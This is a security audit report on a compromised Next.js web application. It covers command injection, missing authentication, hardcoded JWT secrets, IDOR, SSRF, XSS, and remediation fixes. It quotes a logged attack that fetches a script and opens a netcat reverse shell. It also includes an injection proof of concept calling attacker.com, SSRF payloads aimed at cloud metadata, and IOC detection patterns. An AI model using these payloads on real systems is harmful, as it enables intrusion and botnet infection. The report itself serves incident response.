# COMPREHENSIVE SECURITY AUDIT REPORT

**Date:** December 26, 2025
**Severity:** CRITICAL
**Project:** YCH Full-Stack Application
**Auditor:** Security Analysis System
**For:** Senior Management Review

---

## EXECUTIVE SUMMARY

This comprehensive security audit has identified **27+ security vulnerabilities** across the codebase. The most critical finding is an **active Remote Code Execution (RCE) attack** that has compromised the server. Additionally, numerous authentication, authorization, and input validation issues were discovered.

### Vulnerability Summary

| Severity | Count | Examples |
|----------|-------|----------|
| CRITICAL | 5 | Command Injection (RCE), Active Malware |
| HIGH | 12 | Missing Auth, IDOR, Hardcoded Secrets |
| MEDIUM | 7 | XSS, SSRF, Missing Headers |
| LOW | 3 | Information Disclosure |

---

## PART 1: CRITICAL VULNERABILITIES

### 1.1 COMMAND INJECTION (Remote Code Execution) - ACTIVELY EXPLOITED

**Status:** ACTIVELY BEING EXPLOITED
**CVSS Score:** 10.0 (Critical)

#### Evidence from Logs
```
Command failed: cd /tmp; wget -O /tmp/x.sh http://94.154.35.154/weball.sh ;
chmod +x /tmp/x.sh; sh /tmp/x.sh; rm /tmp/f;mkfifo /tmp/f;
cat /tmp/f|/bin/sh -i 2>&1|nc 193.142.147.209 12323 >/tmp/f
```

#### Vulnerable Code Locations

| File | Line | Function | Issue |
|------|------|----------|-------|
| `lib/local.ts` | 101 | `installSSLCertificate()` | `execAsync(\`sudo certbot -d ${domain}\`)` |
| `lib/local.ts` | 48 | `execAsync()` | `ipconfig /flushdns` (less critical) |
| `lib/cloudflare.ts` | 152 | `removeServerSSL()` | `exec(\`sudo certbot revoke...${domain}\`)` |
| `lib/cloudflare.ts` | 167 | `removeServerSSL()` | `exec(\`sudo certbot delete...${domain}\`)` |

#### Attack Entry Points

| Endpoint | Method | Parameter | File |
|----------|--------|-----------|------|
| `/api/site/create` | POST | `domain` | `app/api/site/create/route.ts:355,422` |
| `/api/site/delete` | DELETE | via DB lookup | `app/api/site/delete/route.ts:57` |

#### Proof of Concept Attack
```bash
# Attacker sends this as "domain" field:
test.com; wget http://attacker.com/malware.sh -O /tmp/x.sh && sh /tmp/x.sh; #

# Results in shell execution of:
sudo certbot --nginx -d test.com; wget http://attacker.com/malware.sh -O /tmp/x.sh && sh /tmp/x.sh; # --non-interactive...
```

---

### 1.2 MISSING AUTHENTICATION ON CRITICAL ENDPOINTS

**CVSS Score:** 9.8 (Critical)

The following API endpoints have **NO AUTHENTICATION** and can be accessed by anyone:

| Endpoint | Method | Impact | File |
|----------|--------|--------|------|
| `/api/articles/delete` | POST | Delete ANY article | `app/api/articles/delete/route.tsx` |
| `/api/articles/save` | POST | Create articles on ANY site | `app/api/articles/save/route.ts` |
| `/api/freestar/insertupdate` | POST | Modify analytics data | `app/api/freestar/insertupdate/route.tsx` |
| `/api/profile` | GET | Read ANY user's profile | `app/api/profile/route.ts` |
| `/api/profile` | PATCH | Modify ANY user's profile | `app/api/profile/route.ts` |
| `/api/site/data` | GET | Read site data (public) | `app/api/site/data/route.ts` |

#### Example - Delete Any Article (No Auth)
```typescript
// app/api/articles/delete/route.tsx - Lines 4-21
export async function POST(req: NextRequest) {
  try {
    const { articleId } = await req.json();
    // NO AUTHENTICATION CHECK!
    await prisma.articleTag.deleteMany({ where: { article_id: articleId } });
    await prisma.article.delete({ where: { id: articleId } });
    return NextResponse.json({ success: true });
  }
}
```

#### Example - IDOR in Profile API
```typescript
// app/api/profile/route.ts - Lines 101-117
export async function GET(req: Request) {
  const userId = searchParams?.get("userId");
  // NO CHECK IF REQUESTING USER OWNS THIS PROFILE!
  const user = await prisma.user.findUnique({ where: { id: userId } });
  return NextResponse.json({ ...user data... });
}
```

---

### 1.3 HARDCODED SECRET KEYS

**CVSS Score:** 9.1 (Critical)

Multiple files contain hardcoded fallback secrets that would allow attackers to forge JWTs:

| File | Line | Hardcoded Value |
|------|------|-----------------|
| `app/api/auth/login/route.ts` | 120 | `'your-secret-key'` |
| `app/api/auth/login/route.ts` | 127 | `'your-refresh-secret-key'` |
| `app/api/auth/refresh/route.ts` | 94, 126, 133 | `'your-secret-key'`, `'your-refresh-secret-key'` |
| `app/api/auth/verify/route.ts` | 74 | `'your-secret-key'` |
| `app/api/auth/sessions/route.ts` | 17, 68 | `'your-secret-key'` |
| `app/api/auth/logout/route.tsx` | 90 | `'your-refresh-secret-key'` |
| `app/api/companies/delete/route.ts` | 27 | `'your-secret-key'` |
| `app/api/companies/update/route.ts` | 35 | `'your-secret-key'` |
| `app/api/companies/toggle-status/route.ts` | 34 | `'your-secret-key'` |
| `app/api/site/create/route.ts` | 300 | `'your-secret-key'` |
| `app/api/site/update/route.ts` | 37 | Empty string fallback `''` |

#### Attack Scenario
If `JWT_SECRET` environment variable is not set, attacker can:
1. Generate valid JWTs using `'your-secret-key'`
2. Access any authenticated endpoint
3. Impersonate any user

---

## PART 2: HIGH SEVERITY VULNERABILITIES

### 2.1 INSECURE DIRECT OBJECT REFERENCE (IDOR)

**CVSS Score:** 8.6 (High)

Users can access/modify resources belonging to other users:

| Endpoint | Issue | Impact |
|----------|-------|--------|
| `GET /api/profile?userId=XXX` | No ownership check | Read any user's profile |
| `PATCH /api/profile` | No ownership check | Modify any user's profile |
| `POST /api/articles/save` | No site ownership check | Add articles to any site |
| `POST /api/articles/delete` | No article ownership check | Delete any article |

### 2.2 SERVER-SIDE REQUEST FORGERY (SSRF)

**CVSS Score:** 7.5 (High)

User-provided URLs are fetched without validation:

| File | Line | Vulnerable Code |
|------|------|-----------------|
| `app/api/site/create/route.ts` | 512 | `fetch(logoUrl)` - fetches user-provided URL |
| `app/api/site/create/route.ts` | 575 | `fetch(faviconUrl)` - fetches user-provided URL |

#### Attack Scenarios
```bash
# Access internal services
logoUrl=http://localhost:3000/api/admin/secret

# Access cloud metadata (AWS/GCP/Azure)
logoUrl=http://169.254.169.254/latest/meta-data/

# Port scanning
logoUrl=http://internal-server:22/
```

### 2.3 MISSING RATE LIMITING

**CVSS Score:** 7.5 (High)

No rate limiting on sensitive endpoints:

| Endpoint | Risk |
|----------|------|
| `/api/auth/login` | Brute force password attacks |
| `/api/auth/send-registration-otp` | OTP bombing, SMS costs |
| `/api/auth/forgot-password` | Email bombing |
| `/api/auth/verify-otp` | OTP brute force (6-digit = 1M possibilities) |

### 2.4 WEAK OTP IMPLEMENTATION

**CVSS Score:** 7.2 (High)

```typescript
// lib/otpStore.ts - In-memory OTP storage
const otpStore = new Map<string, { otp: string; expiresAt: number }>();
```

Issues:
- OTPs stored in memory (lost on restart)
- No maximum attempt limit visible in code
- 6-digit OTP is brute-forceable (1,000,000 combinations)
- OTP expiration may be too long

---

## PART 3: MEDIUM SEVERITY VULNERABILITIES

### 3.1 CROSS-SITE SCRIPTING (XSS)

**CVSS Score:** 6.1 (Medium)

Multiple uses of `dangerouslySetInnerHTML` with potentially untrusted content:

| File | Line | Content Source |
|------|------|----------------|
| `app/[category]/[slug]/client.tsx` | 112 | `article.content` from database |
| `app/article/[slug]/page.tsx` | 59 | `article.content` from database |
| `app/for-advertisers/page.tsx` | 60 | `page_html` from database |
| `app/about/page.tsx` | 66 | `page_html` from database |
| `app/terms/page.tsx` | 58 | `page_html` from database |
| `app/privacy-policy/page.tsx` | 60 | `page_html` from database |
| `app/search/[[...slug]]/client.tsx` | 206, 228, 257, 270 | External API data |

If an attacker can inject HTML into articles or static pages, they can execute JavaScript in user browsers.

### 3.2 MISSING SECURITY HEADERS

**CVSS Score:** 5.3 (Medium)

Current headers in `next.config.js`:
```javascript
headers: [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-XSS-Protection', value: '1; mode=block' },
]
```

**Missing Critical Headers:**

| Header | Purpose | Risk Without It |
|--------|---------|-----------------|
| `Content-Security-Policy` | Prevent XSS, injection | XSS attacks possible |
| `Strict-Transport-Security` | Force HTTPS | Man-in-the-middle attacks |
| `Referrer-Policy` | Control referrer info | Information leakage |
| `Permissions-Policy` | Control browser features | Feature abuse |

### 3.3 MIDDLEWARE BYPASS

**CVSS Score:** 5.3 (Medium)

The middleware only protects page routes, not API routes:

```typescript
// middleware.ts - Line 63-66
export const config = {
  matcher: [
    "/((?!api|_next/static|_next/image|favicon.ico|robots.txt|sitemap.xml).*)",
  ],
};
```

**Issue:** All `/api/*` routes are **excluded** from middleware authentication checks!

### 3.4 INSECURE COOKIE CONFIGURATION

**CVSS Score:** 5.3 (Medium)

Cookies are only secure in production:

```typescript
// app/api/auth/login/route.ts - Lines 183-196
response.cookies.set('token', accessToken, {
  httpOnly: true,
  secure: process.env.APP_ENV === 'production' || process.env.APP_ENV === 'staging',
  // Missing: path, domain restrictions
});
```

Issues:
- Development cookies sent over HTTP (can be intercepted)
- No explicit `path` restriction
- No `domain` restriction

---

## PART 4: LOW SEVERITY VULNERABILITIES

### 4.1 INFORMATION DISCLOSURE

| Location | Issue |
|----------|-------|
| Error responses | Stack traces visible in some errors |
| API responses | Internal IDs exposed |
| Console logs | Sensitive data logged in production |

### 4.2 PASSWORD IN LOCAL STORAGE

```typescript
// app/page.tsx - Lines 41-42 (Login page)
const savedEmail = localStorage.getItem("rememberedEmail") || "";
const savedPassword = localStorage.getItem("rememberedPassword") || "";
```

Storing passwords in localStorage is insecure - XSS can steal them.

### 4.3 VERBOSE ERROR MESSAGES

```typescript
// Multiple files
return NextResponse.json({ error: 'User not found' }, { status: 404 });
// Reveals that the email exists or doesn't exist
```

---

## PART 5: MALWARE ANALYSIS

### Downloaded Malware Details

The attack downloaded a **Mirai-style botnet** from `94.154.35.154`:

| Binary | Architecture | Purpose |
|--------|-------------|---------|
| `x86_64.uhavenobotsxd` | 64-bit x86 | Linux malware |
| `x86_32.uhavenobotsxd` | 32-bit x86 | Linux malware |
| `arm*.uhavenobotsxd` | ARM variants | IoT/embedded devices |
| `mips*.uhavenobotsxd` | MIPS variants | Routers/IoT |

### Command & Control

- **C2 Server:** `193.142.147.209:12323`
- **Protocol:** Reverse shell via netcat
- **Persistence:** Named pipe at `/tmp/f`

### Impact

If the malware executed successfully:
1. **DDoS participation** - Server used in attacks
2. **Cryptomining** - CPU mining cryptocurrency
3. **Data exfiltration** - Steal database contents
4. **Lateral movement** - Attack other internal systems

---

## PART 6: COMPLETE VULNERABILITY LIST

| # | Vulnerability | Severity | File | Line |
|---|---------------|----------|------|------|
| 1 | Command Injection (RCE) | CRITICAL | `lib/local.ts` | 101 |
| 2 | Command Injection (RCE) | CRITICAL | `lib/cloudflare.ts` | 152, 167 |
| 3 | Active Malware Infection | CRITICAL | N/A (server) | N/A |
| 4 | Missing Auth - Article Delete | CRITICAL | `api/articles/delete/route.tsx` | 4-21 |
| 5 | Missing Auth - Article Save | CRITICAL | `api/articles/save/route.ts` | 91-184 |
| 6 | Hardcoded JWT Secret | HIGH | `api/auth/login/route.ts` | 120, 127 |
| 7 | Hardcoded JWT Secret | HIGH | `api/auth/refresh/route.ts` | 94, 126, 133 |
| 8 | Hardcoded JWT Secret | HIGH | `api/auth/verify/route.ts` | 74 |
| 9 | Hardcoded JWT Secret | HIGH | `api/auth/sessions/route.ts` | 17, 68 |
| 10 | Hardcoded JWT Secret | HIGH | `api/companies/*.ts` | Various |
| 11 | Hardcoded JWT Secret | HIGH | `api/site/create/route.ts` | 300 |
| 12 | IDOR - Profile Read | HIGH | `api/profile/route.ts` | 101-162 |
| 13 | IDOR - Profile Update | HIGH | `api/profile/route.ts` | 164-229 |
| 14 | Missing Auth - Freestar API | HIGH | `api/freestar/insertupdate/route.tsx` | 5-104 |
| 15 | SSRF - Logo URL | HIGH | `api/site/create/route.ts` | 512 |
| 16 | SSRF - Favicon URL | HIGH | `api/site/create/route.ts` | 575 |
| 17 | No Rate Limiting - Login | HIGH | `api/auth/login/route.ts` | All |
| 18 | Weak OTP Implementation | HIGH | `lib/otpStore.ts` | All |
| 19 | XSS - Article Content | MEDIUM | `app/[category]/[slug]/client.tsx` | 112 |
| 20 | XSS - Static Pages | MEDIUM | `app/*/page.tsx` | Various |
| 21 | XSS - Search Results | MEDIUM | `app/search/[[...slug]]/client.tsx` | 206, 228 |
| 22 | Missing CSP Header | MEDIUM | `next.config.js` | N/A |
| 23 | Missing HSTS Header | MEDIUM | `next.config.js` | N/A |
| 24 | Middleware Bypass | MEDIUM | `middleware.ts` | 63-66 |
| 25 | Insecure Dev Cookies | MEDIUM | `api/auth/login/route.ts` | 185 |
| 26 | Password in localStorage | LOW | `app/page.tsx` | 41-42 |
| 27 | Verbose Error Messages | LOW | Multiple files | Various |

---

## PART 7: REMEDIATION PRIORITY

### IMMEDIATE (Do within 24 hours)

1. **Stop the server** - `pm2 stop all`
2. **Kill malware processes** - `pkill -f "uhavenobotsxd"`
3. **Block attacker IPs** - Firewall rules for `94.154.35.154`, `193.142.147.209`
4. **Remove malware files** - Clean `/tmp/`
5. **Rotate ALL secrets** - JWT, API keys, database passwords
6. **Check for backdoors** - SSH keys, cron jobs, startup scripts

### SHORT-TERM (Do within 1 week)

1. **Fix Command Injection** - Use `spawn()` with array arguments
2. **Add Domain Validation** - Strict regex, no special characters
3. **Add Authentication** - All API routes need auth checks
4. **Remove Hardcoded Secrets** - Require env vars, fail if missing
5. **Fix IDOR** - Verify user owns the resource
6. **Add Rate Limiting** - Use `express-rate-limit` or similar

### MEDIUM-TERM (Do within 1 month)

1. **Add CSP Header** - Prevent XSS
2. **Add HSTS Header** - Force HTTPS
3. **Sanitize HTML** - Use DOMPurify before `dangerouslySetInnerHTML`
4. **Fix SSRF** - Whitelist allowed domains for URL fetching
5. **Secure OTP** - Store in Redis, add attempt limits, use 8+ digits
6. **Security Audit** - External penetration test

---

## PART 8: CODE FIXES

### Fix 1: Domain Validation Function

```typescript
// lib/security.ts - NEW FILE
export function validateDomain(input: string): string | null {
    if (!input || typeof input !== 'string') return null;

    const domain = input.toLowerCase().trim();

    // Strict domain pattern
    const pattern = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$/;
    if (!pattern.test(domain)) return null;

    // Block shell metacharacters
    const dangerous = [';', '|', '&', '$', '`', '(', ')', '{', '}',
                       '<', '>', '"', "'", '\\', '\n', '\r', ' '];
    for (const char of dangerous) {
        if (domain.includes(char)) return null;
    }

    if (domain.length > 253) return null;

    return domain;
}
```

### Fix 2: Safe Shell Command Execution

```typescript
// lib/local.ts - REPLACE installSSLCertificate
import { spawn } from 'child_process';
import { validateDomain } from './security';

export async function installSSLCertificate(domain: string): Promise<boolean> {
    const validDomain = validateDomain(domain);
    if (!validDomain) {
        console.error('Invalid domain rejected:', domain);
        return false;
    }

    return new Promise((resolve) => {
        const proc = spawn('sudo', [
            'certbot', '--nginx',
            '-d', validDomain,
            '--non-interactive',
            '--agree-tos',
            '--register-unsafely-without-email'
        ], { shell: false });

        proc.on('close', (code) => resolve(code === 0));
        proc.on('error', () => resolve(false));
    });
}
```

### Fix 3: Authentication Middleware for APIs

```typescript
// lib/auth.ts - NEW FILE
import { NextRequest, NextResponse } from 'next/server';
import jwt from 'jsonwebtoken';

export function requireAuth(handler: Function) {
    return async (req: NextRequest, ...args: any[]) => {
        const token = req.cookies.get('token')?.value;

        if (!token) {
            return NextResponse.json(
                { error: 'Unauthorized' },
                { status: 401 }
            );
        }

        const secret = process.env.JWT_SECRET;
        if (!secret) {
            console.error('JWT_SECRET not configured!');
            return NextResponse.json(
                { error: 'Server configuration error' },
                { status: 500 }
            );
        }

        try {
            const decoded = jwt.verify(token, secret);
            (req as any).user = decoded;
            return handler(req, ...args);
        } catch {
            return NextResponse.json(
                { error: 'Invalid token' },
                { status: 401 }
            );
        }
    };
}
```

### Fix 4: IDOR Protection

```typescript
// api/profile/route.ts - ADD ownership check
export async function GET(req: Request) {
    const token = req.headers.get('cookie')?.match(/token=([^;]+)/)?.[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET!) as { userId: string };

    const requestedUserId = searchParams?.get("userId");

    // IDOR Protection: User can only access their own profile
    if (requestedUserId !== decoded.userId) {
        return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
    }

    // ... rest of handler
}
```

### Fix 5: Remove Hardcoded Secrets

```typescript
// BEFORE (INSECURE)
jwt.sign(payload, process.env.JWT_SECRET || 'your-secret-key', ...)

// AFTER (SECURE)
const secret = process.env.JWT_SECRET;
if (!secret) {
    throw new Error('FATAL: JWT_SECRET environment variable is required');
}
jwt.sign(payload, secret, ...)
```

### Fix 6: Add Security Headers

```javascript
// next.config.js - Updated headers
async headers() {
    return [{
        source: '/:path*',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'X-XSS-Protection', value: '1; mode=block' },
            { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
            { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
            { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';" },
        ],
    }];
}
```

---

## PART 9: EMERGENCY RESPONSE CHECKLIST

### Server Cleanup
```bash
# 1. Stop all processes
pm2 stop all
pm2 delete all

# 2. Kill suspicious processes
pkill -9 -f "uhavenobotsxd"
pkill -9 -f "nc.*12323"
pkill -9 -f "wget.*154"
pkill -9 -f "curl.*154"

# 3. Clean malware files
rm -rf /tmp/*.sh
rm -rf /tmp/*uhavenobotsxd*
rm -rf /tmp/f
find /tmp -type f -executable -delete

# 4. Block attackers
iptables -A INPUT -s 94.154.35.154 -j DROP
iptables -A OUTPUT -d 94.154.35.154 -j DROP
iptables -A INPUT -s 193.142.147.209 -j DROP
iptables -A OUTPUT -d 193.142.147.209 -j DROP

# 5. Check for persistence
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
cat ~/.bashrc | tail -20
cat /etc/rc.local 2>/dev/null

# 6. Check SSH keys
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys 2>/dev/null

# 7. Check for new users
cat /etc/passwd | grep -v nologin | grep -v false
lastlog | head -20

# 8. Review network connections
netstat -tulpn
ss -tulpn
lsof -i :12323
```

### Credential Rotation
```bash
# Generate new secrets
openssl rand -base64 64  # For JWT_SECRET
openssl rand -base64 64  # For JWT_REFRESH_SECRET

# Update in .env:
JWT_SECRET=<new_value>
JWT_REFRESH_SECRET=<new_value>

# Rotate other credentials:
# - Database password
# - SendGrid API key
# - Cloudflare API token
# - OpenAI API key
# - DigitalOcean Spaces keys
```

---

## PART 10: COMPLIANCE CONSIDERATIONS

### GDPR (If EU Users)
- Data breach notification within 72 hours
- Document all remediation steps
- Notify affected users if personal data accessed

### PCI-DSS (If Payment Data)
- Incident response procedures
- Forensic investigation
- Card brand notification

### Evidence Preservation
- Save all PM2 logs
- Export database audit logs
- Capture network traffic logs
- Document timeline of events

---

## APPENDIX A: INDICATORS OF COMPROMISE (IOCs)

### Network
```
IP: 94.154.35.154 (Malware distribution)
IP: 193.142.147.209 (C2 server)
Port: 12323 (Reverse shell)
```

### Files
```
/tmp/x.sh
/tmp/weball.sh
/tmp/f (named pipe)
*uhavenobotsxd* (any architecture)
```

### Processes
```
./uhavenobotsxd
nc.*12323
wget.*94.154
curl.*94.154
/bin/sh -i
```

### Commands in Logs
```
cd /tmp
wget.*weball.sh
mkfifo /tmp/f
nc.*12323
```

---

## APPENDIX B: TESTING CHECKLIST

After fixes are applied, test:

- [ ] Domain validation rejects `;`, `|`, `&`, etc.
- [ ] All API endpoints require authentication
- [ ] Users can only access their own resources
- [ ] JWT fails with invalid/expired tokens
- [ ] Rate limiting blocks brute force
- [ ] Security headers present in responses
- [ ] XSS payloads are sanitized
- [ ] SSRF URLs are validated

---

## DOCUMENT INFORMATION

| Field | Value |
|-------|-------|
| Report Version | 2.0 |
| Classification | CONFIDENTIAL |
| Distribution | Senior Management, Security Team, Development Lead |
| Next Review | After remediation complete |

---

**END OF REPORT**
